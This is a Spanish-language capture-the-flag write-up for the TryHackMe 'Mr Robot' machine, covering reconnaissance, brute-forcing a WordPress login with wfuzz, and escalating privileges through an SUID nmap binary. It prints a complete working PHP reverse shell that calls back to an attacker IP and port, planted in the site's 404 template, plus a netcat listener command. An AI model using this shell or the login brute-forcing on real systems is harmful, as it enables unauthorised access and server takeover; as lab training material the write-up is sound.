---
title: Máquina|Mr Robot|THM
published: True
---
<div class="contenedor">
    <img src="imgs/mrRobot/mrRobot.png" width="160" alt="Cheese logo">
    <div>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Media </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://tryhackme.com/room/mrrobot" style="color: lightblue;">MrRobot</a></p>
    </div>
</div>



<h2><font color="white"><center># Mr.Robot</center></font></h2>
* <p>Empezamos con el reconocimiento, en este caso la ip es : <bold>10.10.94.16</bold></p>
> ping -c 1 10.10.94.16
>
<img src="/imgs/mrRobot/mrRobot1.png"/>
>
* <p>Por el ttl (64) nos fijamos de que nos enfrentamos a una maquina linux,
ahora vamos a hacer un reconocimiento de puertos abiertos. </p>
>
<img src="/imgs/mrRobot/mrRobot2.png"/>
<br>
* <p>Vemos que tiene el puerto <font color="lime">80/http</font> y el <font color="lime">444/tcp,</font> ahora vamos a ver el puerto 80 http a ver que nos informa.</p>
>
<img src="/imgs/mrRobot/mrRobot3.png"/>
* <p> Si vemos detalladamente todo, observaremos que no mostrara nada relevante, por lo tanto pasamos a la enumeración de "DirectoriosActivos" .</p>
> wfuzz -t 200 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.94.16/FUZZ
>
<img src="/imgs/mrRobot/mrRobot4.png"/>
* <p>Entre algunas cosas vemos que nos enumera cosas interesantes como :
robots.txt | wp-login.php, del resto solo es codigo de estado 301, ahora vamos a ver el robots.txt </p>
>
<img src="/imgs/mrRobot/mrRobot5.png"/>
* <p>Al parecer encontramos la llave 1 </p>
>
<img src="/imgs/mrRobot/mrRobot6.png"/>
* <p>Ahora descargaremos el archivo fsocity.dic, y leemos que tiene el archivo.</p>
>
<img src="/imgs/mrRobot/mrRobot7.png"/>
>
`Podemos ver que el archivo  fsocity.dic  solo parace ser un diccionario.`
* <p>Ahora veremos el wp-login.php</p>
>
<img src="/imgs/mrRobot/mrRobot8.png"/>
* <p>Ahora vemos que es un login asi que teniendo un diccionario que me proporciono la misma pagina web por que no usarlo contra si misma?,</p>
> wfuzz -t 200 -c --hs "Invalid username" -z file,fsocity.dic  -d "log=FUZZ&pwd=NULL" http://10.10.94.16/wp-login.php
>
<img src="/imgs/mrRobot/mrRobot9.png"/>
* <p>Ok tenemos ya el username Eliot nos falta ahora la contraseña, hagamos de nuevo lo mismo.</p>
> wfuzz -t 200 -c --hc=200  -z file,fsocity.dic -d "log=Elliot&pwd=FUZZ" http://10.10.94.16/wp-login.php
>
<img src="/imgs/mrRobot/mrRobot10.png"/>
* <p>Ok listo ahora tenemos la contraseña del usuario Elliot, ahora solo queda iniciar session en el wp-login.php.</p>
>
<img src="/imgs/mrRobot/mrRobot11.png"/>
* <p>Una vez adentro tenemos que ganar acceso por medio de una web-shell, para ello me ire a apariencia y la seccion 404. quitare todo el codigo php y lo remplazare por el siguiente</p>

```php

<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.18.27.215';  // CHANGE THIS
$port = 5454;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```
* <p>Este archivo lo que hace es que cuando la pagina lance un codigo de estado 404 Not Found lo que haga sea darme una shell por el puerto 5454 a mi direccion Ip, asi que me pondre en escucha por el puerto 5454.</p>
> sudo nc -nlvp 5454
>
<img src="/imgs/mrRobot/mrRobot12.png"/>
* <p>Ahora guardado una vez los caembios en el panel, vamos a una pagina web del servidor la cual no exista por ejemplo 
<br><font color="red">http://10.10.94.16/noexisteestapagina</font> y regresamos a nuestra terminal veremos lo siguiente. </p>
>
<img src="/imgs/mrRobot/mrRobot13.png"/>
* <p>Una shell listo pero ahora somos deamon vamos a elevar privilegios, veamos que hay adentro del sistema,
<br>pero antes salgamos del caparazon de la terminal que tenemos con el siguiente comando.</p>
> python -c "import pty; pty.spwan('/bin/bash')"
>
<img src="/imgs/mrRobot/mrRobot14.png"/>
* <p>Al hacer un ls en la ruta /home/robot vemos que hay dos archivos uno contiene la segunda llave y el otro es un archivo encriptado en md5.</p>
>
<img src="/imgs/mrRobot/mrRobot15.png"/>

* <p>Vamos a decodificar el hash colocandolo en alguna pagina para decifrarle.</p>
>
<img src="/imgs/mrRobot/mrRobot16.png"/>

* <p>El hash al decifrarlo solo era un mensaje de la [a-z]. 
Ahora usemos ese mensaje decifrado para convertirnos en el usuario robot del sistema, y ver en que permisos de aplicaciones del sitema nos puede ayduar
para escalar privilegios.</p>
>
<img src="/imgs/mrRobot/mrRobot17.png"/>

* <p>Veamos Si tenemos permssos UID por root con el que podamos aprovecharnos</p>
> find /usr -perm +6000  \| grep '/bin'
>
<img src="/imgs/mrRobot/mrRobot18.png">
* <p>Vemos que tenemos permisos sobre el binario /usr/local/bin/nmap el cual nos aproavchamos del comando --interactive para ser root</p>


